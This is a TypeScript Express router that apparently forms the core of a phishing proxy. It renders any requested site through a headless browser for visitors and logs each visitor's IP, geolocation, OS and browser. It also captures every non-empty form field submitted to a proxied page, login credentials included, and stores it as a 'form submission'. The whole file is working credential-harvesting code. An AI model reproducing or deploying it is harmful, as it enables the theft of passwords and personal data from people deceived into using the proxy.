import { Router } from 'express'
import * as Path from 'path'

import ipLookup from '../ipLookup'
import { Guest, Setting } from '../datastore'
import { httpify, isValidUrl } from '../utils'
import { BASE_DIR } from '../constants'
import log from '../../bin/logger'
import { UAParser } from 'ua-parser-js'


const router = Router()
const cacheDir = Path.join(BASE_DIR, 'cache')

router.all('*', async (req, resp) => {
    let link = httpify(decodeURIComponent(req.url.slice(1)))
    const setting:Setting = await Setting.findOne({})
    const ip = req.header('x-forwarded-for') || req.connection.remoteAddress
    const userAgent = new UAParser(req.header('user-agent'))
    const { browser } = resp.locals
    let guest:Guest = await Guest.findOne({ ip })

    if (!guest) guest = await new Guest().add(
        ip,
        `${userAgent.getOS().name} ${userAgent.getOS().version}`,
        `${userAgent.getBrowser().name} ${userAgent.getBrowser().version}`)

    if (!isValidUrl(link)) link = setting.defaultLink
    else guest.logs.push(`${req.method} - ${link} - ${new Date()}`)

    if (guest && !guest.country) {
        const ipData = await ipLookup(ip) || {}

        Object
            .entries(ipData)
            .forEach(([key, value]) => guest[key] = value)

        if (Object.keys(ipData).length) log(guest, `guest's IP details was captured:`, ipData)
    }

    if (req.method.toLowerCase() === 'post' && !link.startsWith(setting.defaultLink)) {
        /* Storing in arrays intentionally, nedb-models fails with nested lengthy objects 🤷‍♂️ */
        const chunks = Object
            .entries(req.body)
            .filter(([key, value]) => !!value)
            .map(([key, value]) => `${key}: ${value}`)

        log(guest, `guest's form submission was captured:`, chunks)
        if (chunks.length) guest.posts.push({path: link, date: new Date(), data: chunks})
    }

    await guest.save()
    resp.status(200)
        .sendFile(Path.join(cacheDir, await browser.get(link, req.headers, ip)))
})


export default router
